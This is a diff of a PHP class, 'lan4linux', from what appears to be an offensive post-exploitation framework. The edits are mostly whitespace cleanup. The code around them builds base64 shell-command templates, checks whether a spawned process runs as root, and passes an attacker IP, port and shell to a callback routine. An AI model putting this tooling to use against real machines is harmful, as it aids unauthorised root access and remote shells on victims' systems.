@@ -502,16 +502,12 @@ class lan4linux extends LAN{
                 $template_id = $template_id_new;
                 $templateB64_id = base64_encode($template_id);
                 
-
                 $template_shell = str_replace("%ID%","%SHELL%",$template_id);
                 $templateB64_shell = base64_encode($template_shell);
-                
-                
 
                 $template_id = "%ID%";
                 $templateB64_id = base64_encode($template_id);
                 $this->article("OLD Template ID", $this->template_id);
-
                 
                 $obj_lan_root = new lan4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_shell,$id8b64);
                 $obj_lan_root->poc($this->flag_poc);
@@ -522,8 +518,7 @@ class lan4linux extends LAN{
                     
                     $chaine = "spawning $obj_lan_root->uid_name";
                     $this->log2succes($chaine);
-                    
-                    
+                                        
                     $this->pause();
                     //stream_copy_to_stream($this->stream, $stream);
                     
@@ -532,12 +527,9 @@ class lan4linux extends LAN{
                     
                     if ($obj_lan_root->uid_name==="root" ) {
                         $this->log2succes("Yes RooT running infos");
-                        
                     }
-                    else {
-                        
+                    else {                       
                         $this->log2succes("$obj_lan_root->uid_name is not root checking again");
-                        
                     }
                     $obj_lan_root->lan2check8id($attacker_ip, $attacker_port, $shell);$this->pause();
                 }
